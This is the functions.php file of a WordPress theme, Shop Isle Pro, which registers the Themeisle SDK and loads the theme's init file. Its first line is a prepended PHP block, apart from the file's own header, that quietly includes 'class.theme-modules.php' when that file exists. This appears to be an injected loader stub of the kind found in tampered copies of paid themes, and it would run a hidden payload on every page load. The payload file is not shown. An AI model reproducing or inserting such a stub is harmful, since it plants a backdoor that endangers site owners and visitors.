<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Main functions file
 *
 * @package WordPress
 * @subpackage Shop Isle
 */

/**
 * Initialize all the things.
 */
require get_template_directory() . '/inc/init.php';

/**
 * Note: Do not add any custom code here. Please use a child theme so that your customizations aren't lost during updates.
 * http://codex.wordpress.org/Child_Themes
 */



function shop_isle_pro_themeisle_sdk(){
	require dirname(__FILE__).'/vendor/themeisle/load.php';
	themeisle_sdk_register (
		array(
			'product_slug'=>'shop-isle-pro',
			'store_url'=>'https://themeisle.com',
			'store_name'=>'Themeisle',
			'product_type'=>'theme',
			'wordpress_available'=>false,
			'paid'=>true,
		)
	);
}

shop_isle_pro_themeisle_sdk(); 

 
